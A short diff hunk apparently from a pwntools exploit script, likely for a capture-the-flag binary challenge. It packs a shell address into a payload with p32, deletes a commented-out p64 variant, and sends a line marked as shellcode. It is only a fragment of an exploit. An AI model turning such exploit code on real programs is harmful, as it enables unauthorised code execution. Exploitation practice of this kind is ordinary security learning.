@@ -12,7 +12,6 @@ log.info(ret)
 
 payload = ""
 payload += p32(shell)
-#payload += p64(shell)
 
 conn.sendline()　#shellcode
 
